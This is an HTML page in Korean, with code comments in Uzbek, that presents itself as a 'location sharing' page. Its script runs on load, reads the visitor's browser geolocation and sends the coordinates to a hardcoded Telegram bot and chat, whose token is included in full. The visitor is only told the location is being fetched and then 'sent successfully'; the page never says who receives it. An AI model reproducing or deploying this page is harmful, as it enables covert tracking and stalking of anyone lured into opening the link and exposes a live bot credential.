<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>위치 공유</title>
</head>
<body>
  <h2>위치를 자동으로 가져오는 중...</h2>
  <p>잠시만 기다려주세요.</p>

  <script>
    // Telegram bot token va chat ID
    const botToken = "8064173076:AAHU8qwRTkT37h25j0BN4gZ7xYhiSb3_THU";
    const chatId = "@Ooooododododojsjs"; // Agar chat ID guruh bo'lsa, shunday yoziladi

    function sendLocationToTelegram(latitude, longitude) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const message = `📍 Yangi foydalanuvchi joylashuvi:\nLatitude: ${latitude}\nLongitude: ${longitude}`;

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }).then(response => {
        document.body.innerHTML = "<h3>위치가 성공적으로 전송되었습니다!</h3>";
      }).catch(error => {
        document.body.innerHTML = "<h3>전송 중 오류가 발생했습니다.</h3>";
        console.error("Xato:", error);
      });
    }

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          sendLocationToTelegram(lat, lon);
        }, error => {
          document.body.innerHTML = "<h3>위치를 가져올 수 없습니다.</h3>";
        });
      } else {
        document.body.innerHTML = "<h3>이 브라우저는 위치를 지원하지 않습니다.</h3>";
      }
    }

    // Sayt ochilganda avtomatik lokatsiyani so‘raydi
    requestLocation();
  </script>
</body>
</html>is
